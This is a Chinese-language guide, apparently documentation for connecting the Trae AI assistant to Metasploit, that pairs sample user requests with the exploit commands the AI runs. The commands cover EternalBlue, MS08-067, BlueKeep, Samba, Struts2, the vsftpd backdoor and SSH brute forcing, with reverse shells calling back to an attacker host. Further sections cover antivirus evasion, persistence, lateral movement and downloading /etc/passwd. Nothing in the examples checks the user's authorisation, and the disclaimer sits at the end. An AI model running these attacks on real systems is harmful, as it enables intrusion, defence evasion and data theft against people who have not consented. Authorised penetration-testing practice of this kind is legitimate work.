# 漏洞利用範例 - Trae AI + Metasploit MCP

本文檔展示如何透過 Trae AI 使用 Metasploit 的 exploit 模組進行漏洞利用。

⚠️ **重要提醒：所有範例僅限於授權的滲透測試環境中使用**

## Windows 系統漏洞利用

### 1. MS17-010 EternalBlue 利用

**用戶提問：**
```
利用 MS17-010 漏洞攻擊 192.168.1.50 並獲取 Meterpreter shell
```

**Trae AI 操作流程：**
1. 選擇 exploit：`use exploit/windows/smb/ms17_010_eternalblue`
2. 設置目標：`set RHOSTS 192.168.1.50`
3. 選擇 payload：`set PAYLOAD windows/x64/meterpreter/reverse_tcp`
4. 設置回連 IP：`set LHOST 192.168.1.100`
5. 設置回連端口：`set LPORT 4444`
6. 檢查選項：`show options`
7. 執行攻擊：`exploit`

**預期結果：**
```
[*] Started reverse TCP handler on 192.168.1.100:4444
[*] 192.168.1.50:445 - Connecting to target for exploitation.
[+] 192.168.1.50:445 - Connection established for exploitation.
[*] Sending stage (200262 bytes) to 192.168.1.50
[*] Meterpreter session 1 opened
meterpreter >
```

### 2. MS08-067 NetAPI 利用

**用戶提問：**
```
對 Windows XP 系統使用 MS08-067 漏洞
```

**Trae AI 操作流程：**
1. 選擇 exploit：`use exploit/windows/smb/ms08_067_netapi`
2. 設置目標：`set RHOSTS 192.168.1.60`
3. 選擇目標系統：`set TARGET 0` (Windows XP SP0/SP1 Universal)
4. 設置 payload：`set PAYLOAD windows/meterpreter/reverse_tcp`
5. 配置回連設置：`set LHOST 192.168.1.100`
6. 執行攻擊：`exploit`

### 3. Windows RDP BlueKeep 利用

**用戶提問：**
```
測試目標是否存在 CVE-2019-0708 BlueKeep 漏洞
```

**Trae AI 操作流程：**
1. 先檢測漏洞：`use auxiliary/scanner/rdp/cve_2019_0708_bluekeep`
2. 設置目標：`set RHOSTS 192.168.1.70`
3. 執行檢測：`run`
4. 如果存在漏洞，使用 exploit：`use exploit/windows/rdp/cve_2019_0708_bluekeep_rce`

## Linux 系統漏洞利用

### 4. Samba 漏洞利用

**用戶提問：**
```
利用 Samba 的 is_known_pipename 漏洞攻擊 Linux 服務器
```

**Trae AI 操作流程：**
1. 選擇 exploit：`use exploit/linux/samba/is_known_pipename`
2. 設置目標：`set RHOSTS 192.168.1.80`
3. 設置 payload：`set PAYLOAD linux/x86/meterpreter/reverse_tcp`
4. 配置回連：`set LHOST 192.168.1.100`
5. 執行攻擊：`exploit`

### 5. Apache Struts2 漏洞利用

**用戶提問：**
```
利用 Struts2 REST Plugin XStream RCE 漏洞
```

**Trae AI 操作流程：**
1. 選擇 exploit：`use exploit/multi/http/struts2_rest_xstream`
2. 設置目標：`set RHOSTS 192.168.1.90`
3. 設置端口：`set RPORT 8080`
4. 設置目標路徑：`set TARGETURI /struts2-rest-showcase`
5. 選擇 payload：`set PAYLOAD linux/x86/meterpreter/reverse_tcp`
6. 執行攻擊：`exploit`

## Web 應用漏洞利用

### 6. SQL 注入利用

**用戶提問：**
```
利用 Web 應用的 SQL 注入漏洞獲取數據庫訪問權限
```

**Trae AI 操作流程：**
1. 選擇 exploit：`use exploit/multi/http/php_cgi_arg_injection`
2. 設置目標：`set RHOSTS 192.168.1.95`
3. 設置目標 URI：`set TARGETURI /vulnerable.php`
4. 設置 payload：`set PAYLOAD php/meterpreter/reverse_tcp`
5. 執行攻擊：`exploit`

### 7. 文件上傳漏洞利用

**用戶提問：**
```
利用 Web 應用的文件上傳功能獲取 shell
```

**Trae AI 操作流程：**
1. 選擇 exploit：`use exploit/multi/http/php_include`
2. 設置目標和路徑參數
3. 配置 payload 和回連設置
4. 執行攻擊

## 服務特定漏洞利用

### 8. SSH 弱密碼利用

**用戶提問：**
```
利用 SSH 弱密碼獲取系統訪問權限
```

**Trae AI 操作流程：**
1. 先進行密碼爆破：`use auxiliary/scanner/ssh/ssh_login`
2. 設置字典文件：`set USER_FILE users.txt`
3. 設置密碼字典：`set PASS_FILE passwords.txt`
4. 成功後使用：`use exploit/multi/ssh/sshexec`
5. 設置憑據：`set USERNAME found_user`
6. 設置密碼：`set PASSWORD found_password`

### 9. FTP 服務漏洞利用

**用戶提問：**
```
利用 vsftpd 2.3.4 後門漏洞
```

**Trae AI 操作流程：**
1. 選擇 exploit：`use exploit/unix/ftp/vsftpd_234_backdoor`
2. 設置目標：`set RHOSTS 192.168.1.85`
3. 執行攻擊：`exploit`
4. 獲得 shell 後升級：`python -c 'import pty; pty.spawn("/bin/bash")'`

## 高級利用技巧

### 10. Payload 編碼和規避

**用戶提問：**
```
如何規避防病毒軟件的檢測？
```

**Trae AI 建議的方法：**
1. 使用編碼器：`set ENCODER x86/shikata_ga_nai`
2. 多次編碼：`set ITERATIONS 5`
3. 使用自定義模板：`set TEMPLATE /path/to/template.exe`
4. 選擇規避 payload：`windows/meterpreter/reverse_https`

### 11. 多階段攻擊

**用戶提問：**
```
設計一個多階段的攻擊流程
```

**Trae AI 建議的流程：**
1. **偵察階段**：使用 auxiliary 模組收集信息
2. **初始訪問**：利用發現的漏洞獲取立足點
3. **權限提升**：使用 post 模組提升權限
4. **橫向移動**：利用憑據攻擊其他系統
5. **持久化**：建立持久化訪問機制

### 12. 目標特定配置

**用戶提問：**
```
如何針對特定的操作系統版本優化攻擊？
```

**Trae AI 配置建議：**
```
# 查看可用目標
show targets

# 設置特定目標
set TARGET 2

# 查看目標詳細信息
info

# 設置高級選項
set PrependMigrate true
set EXITFUNC thread
```

## 攻擊後處理

### 13. Session 管理

**用戶提問：**
```
如何管理獲得的 Meterpreter sessions？
```

**Trae AI 操作指南：**
```
# 列出所有 sessions
sessions -l

# 與特定 session 交互
sessions -i 1

# 在後台運行 session
sessions -d 1

# 升級 shell 到 Meterpreter
sessions -u 1
```

### 14. 證據收集

**用戶提問：**
```
成功利用後如何收集證據？
```

**Trae AI 建議的步驟：**
1. 截圖：`screenshot`
2. 系統信息：`sysinfo`
3. 用戶信息：`getuid`
4. 網絡配置：`ipconfig`
5. 進程列表：`ps`
6. 下載關鍵文件：`download /etc/passwd`

## 安全和合規

### 15. 負責任的披露

**用戶提問：**
```
發現漏洞後應該如何處理？
```

**Trae AI 建議的流程：**
1. **文檔記錄**：詳細記錄漏洞和利用過程
2. **風險評估**：評估漏洞的影響和嚴重程度
3. **修復建議**：提供具體的修復方案
4. **時間線**：制定合理的修復時間表
5. **驗證測試**：確認修復措施的有效性

## 故障排除

### 16. 常見問題解決

**用戶提問：**
```
Exploit 執行失敗，如何診斷問題？
```

**Trae AI 診斷步驟：**
1. **檢查目標可達性**：`ping target_ip`
2. **驗證服務狀態**：使用相應的 scanner 模組
3. **檢查 payload 兼容性**：`show payloads`
4. **調整高級選項**：`show advanced`
5. **啟用詳細輸出**：`set VERBOSE true`

---

**免責聲明：本文檔僅供教育和授權測試使用。使用者必須遵守相關法律法規，並確保擁有適當的授權。**